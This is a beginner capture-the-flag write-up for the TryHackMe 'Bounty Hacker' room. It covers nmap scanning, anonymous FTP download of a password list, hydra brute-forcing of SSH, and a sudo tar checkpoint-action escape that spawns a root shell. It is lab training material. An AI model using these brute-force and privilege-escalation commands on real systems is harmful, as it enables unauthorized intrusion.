# Bounty Hacker - TryHackMe Write-up

- **Platform:** [TryHackMe](https://tryhackme.com/)
- **Room:** Bounty Hacker
- **Difficulty:** Easy
- **Category:** Boot2Root
- **Tools Used:** Kali Linux

## Challenge Overview 

Bounty Hacker is a beginner-friendly Linux room where you act as an attacker breaking into a vulnerable system

---


## Recon

<details>
<summary>Click here</summary>
<br>

 First , we start by running nmap command :

 ```bash
nmap -Pn -sC -sV -T4 <target ip address>
```

<img width="788" height="557" alt="image" src="https://github.com/user-attachments/assets/06aebf67-15c9-421d-8ceb-8d9c77f6a12e" />


- -Pn : skip ping scanning
- -sC : default scanning
- -sV : tell version of the software
- -T4 : make the scanning even faster


We found that there is 3 port open :

- 21: ftp

- 22: SSH

- 80: web-server

<br>

### Exploration

Now let explore the open port. i start with ftp port first:

<br>

**FTP**

We know that ftp port allowed login as anonymous so let use that as our username.

<img width="1337" height="505" alt="image" src="https://github.com/user-attachments/assets/cdad6cc8-5a96-4dab-8010-cb9db3bd36f9" />

<br>

Inside this ftp , we found there is 2 txt file which is

- locks.txt
- task.txt

let download this (by using command ```get``` ) and see what in it.


Before i read the those 2 file, i decided to use gobuster if there is another directories that can access but it show nothing useful


<img width="772" height="413" alt="image" src="https://github.com/user-attachments/assets/dab843cf-7534-4a18-a415-beb153b13490" />


So let see the txt file that we just downloaded.


**task.txt**

<img width="340" height="92" alt="image" src="https://github.com/user-attachments/assets/5d97ed99-fab3-4dee-a54f-126f8ca7bcef" />

> 1. Who wrote the task list? ***

**locks.txt**

<img width="375" height="441" alt="image" src="https://github.com/user-attachments/assets/fa7bd8e1-07fb-4253-8f5e-b8a75505b572" />

Inside those 2 txt files, we found possible login credintials (username & password)

So next step , we try **bruteforce** technique to login the ssh port. 

> 2. What service can you bruteforce with the text file found? s**

</details>

---



## Exploitation
<details>
<summary>Click here</summary>
 <br> 

For brute force, i use this command :

```bash
hydra ssh://ip address -l <username> -P locks.txt
```

- -l : single user
- -L : list of user
- -p : single password
- -P : list of password

<img width="1333" height="238" alt="image" src="https://github.com/user-attachments/assets/9d85bc01-0970-427c-bcdd-3fe78d055482" />

<br>

and we got the login credintials. lets login ssh with these credintials


> 3. What is the users password? **************


### Login via SSH

```bash
ssh username@ip
```

enter the password  and we successfully login at ssh port.


<img width="961" height="498" alt="image" src="https://github.com/user-attachments/assets/b864e37b-9e85-4437-a140-5d054234e374" />

</details>

---


## Find the user flag 

<details>
<summary>Click here</summary>
<br>

After we in , just simply get our user flag


<img width="407" height="90" alt="image" src="https://github.com/user-attachments/assets/8f528fb4-3b75-45a8-9adc-0e3bfd909a1a" />

> 4. user.txt : THM{*****************}

</details>

---


## Privilege Escalation

<details>
<summary>Click here</summary>

Next, let see what this user can do. We just need to type

```bash
sudo -l
```

<img width="958" height="113" alt="image" src="https://github.com/user-attachments/assets/50289711-6943-4263-840b-ac9c4790df25" />

The user can run the ```/bin/tar``` program as root

Go to [GTFObins](https://gtfobins.org/) and search for ```tar``` and copy the command ( at sudo section ).

<img width="1017" height="458" alt="image" src="https://github.com/user-attachments/assets/7266fe15-a8fd-468f-80df-743f2532528f" />

<br>

and then type 

```bash
sudo tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

And we successfully access the root.

And then just simply type 

```bash
whoami
```

for cofirmation 

And get the root flag by type


```bash
cat /root/root.xt
```


<img width="925" height="115" alt="image" src="https://github.com/user-attachments/assets/8e49ebea-5fc8-4bc4-a6c0-77b531f0f09d" />


</details>
